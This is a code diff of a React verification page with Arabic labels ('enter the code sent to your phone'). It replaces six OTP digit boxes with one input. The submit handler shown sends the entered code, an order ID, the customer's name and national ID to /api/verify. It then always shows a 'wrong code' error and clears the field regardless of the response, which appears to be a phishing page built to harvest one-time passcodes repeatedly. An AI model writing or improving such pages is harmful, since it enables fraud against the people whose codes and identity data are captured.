@@ -19,9 +19,8 @@ import {
 } from "react-icons/io5";
 
 export default function VerifyPage() {
-  const OTP_LENGTH = 6;
-  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(""));
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
+  const [otp, setOtp] = useState("");
+  const inputRef = useRef<HTMLInputElement | null>(null);
   const [codeError, setCodeError] = useState(false);
   const [lengthError, setLengthError] = useState(false);
   const [resent, setResent] = useState(false);
@@ -84,36 +83,11 @@ export default function VerifyPage() {
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
-  // Focus first input on mount
-  useEffect(() => { inputRefs.current[0]?.focus(); }, []);
-
-  function handleChange(index: number, value: string) {
-    const digit = value.replace(/\D/g, "").slice(-1);
-    const newOtp = [...otp];
-    newOtp[index] = digit;
-    setOtp(newOtp);
-    setCodeError(false);
-    setLengthError(false);
-    if (digit && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
-  }
-
-  function handleKeyDown(index: number, e: React.KeyboardEvent) {
-    if (e.key === "Backspace" && !otp[index] && index > 0) inputRefs.current[index - 1]?.focus();
-  }
-
-  function handlePaste(e: React.ClipboardEvent) {
-    e.preventDefault();
-    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
-    const newOtp = [...otp];
-    pasted.split("").forEach((ch, i) => { newOtp[i] = ch; });
-    setOtp(newOtp);
-    const focusIdx = Math.min(pasted.length, OTP_LENGTH - 1);
-    inputRefs.current[focusIdx]?.focus();
-  }
+  useEffect(() => { inputRef.current?.focus(); }, []);
 
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
-    const code = otp.join("");
+    const code = otp.trim();
     if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
     await fetch("/api/verify", {
       method: "POST",
@@ -121,8 +95,8 @@ export default function VerifyPage() {
       body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
     setCodeError(true);
-    setOtp(Array(OTP_LENGTH).fill(""));
-    inputRefs.current[0]?.focus();
+    setOtp("");
+    inputRef.current?.focus();
     setSubmitCooldown(5);
     clearInterval(submitCooldownRef.current!);
     submitCooldownRef.current = setInterval(() => {
@@ -285,7 +259,7 @@ export default function VerifyPage() {
                 >
                   <IoKeyOutline size={28} className="text-white" />
                 </motion.div>
-                <h1 className="text-xl font-extrabold text-gray-800 mb-2">رمز التحقق</h1>
+                <h1 className="text-xl font-extrabold text-gray-800 mb-2">رمز التحقق (OTP)</h1>
                 <p className="text-gray-400 text-sm leading-relaxed flex items-center justify-center gap-1.5">
                   <IoPhonePortraitOutline size={14} />
                   أدخل الرمز المرسل إلى هاتفك
@@ -302,30 +276,27 @@ export default function VerifyPage() {
 
               {/* OTP Boxes */}
               <form onSubmit={handleSubmit} className="space-y-5">
-                <div className="flex justify-center gap-2 sm:gap-3" dir="ltr">
-                  {otp.map((digit, i) => (
-                    <motion.input
-                      key={i}
-                      ref={(el) => { inputRefs.current[i] = el; }}
-                      type="text"
-                      inputMode="numeric"
-                      maxLength={1}
-                      value={digit}
-                      onChange={(e) => handleChange(i, e.target.value)}
-                      onKeyDown={(e) => handleKeyDown(i, e)}
-                      onPaste={i === 0 ? handlePaste : undefined}
-                      initial={{ opacity: 0, y: 10 }}
-                      animate={{ opacity: 1, y: 0 }}
-                      transition={{ delay: i * 0.05 }}
-                      className={`w-11 h-13 sm:w-13 sm:h-15 text-center text-xl sm:text-2xl font-extrabold rounded-xl border-2 outline-none transition-all duration-200 ${
-                        codeError
-                          ? "border-red-300 bg-red-50/50 text-red-500 animate-[shake_0.3s_ease]"
-                          : digit
-                          ? "border-[#0F4C6E] bg-[#0F4C6E]/5 text-[#0F4C6E]"
-                          : "border-gray-200 bg-gray-50 text-gray-800 focus:border-[#0F4C6E] focus:bg-white focus:shadow-[0_0_0_3px_rgba(15,76,110,0.1)]"
-                      }`}
-                    />
-                  ))}
+                <div dir="ltr">
+                  <input
+                    ref={inputRef}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={6}
+                    placeholder="أدخل الرمز"
+                    value={otp}
+                    onChange={(e) => {
+                      setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
+                      setCodeError(false);
+                      setLengthError(false);
+                    }}
+                    className={`w-full h-13 text-center text-xl font-extrabold rounded-xl border-2 outline-none transition-all duration-200 tracking-[0.3em] ${
+                      codeError
+                        ? "border-red-300 bg-red-50/50 text-red-500 animate-[shake_0.3s_ease]"
+                        : otp
+                        ? "border-[#0F4C6E] bg-[#0F4C6E]/5 text-[#0F4C6E]"
+                        : "border-gray-200 bg-gray-50 text-gray-800 focus:border-[#0F4C6E] focus:bg-white focus:shadow-[0_0_0_3px_rgba(15,76,110,0.1)]"
+                    }`}
+                  />
                 </div>
 
                 {/* Error Messages */}
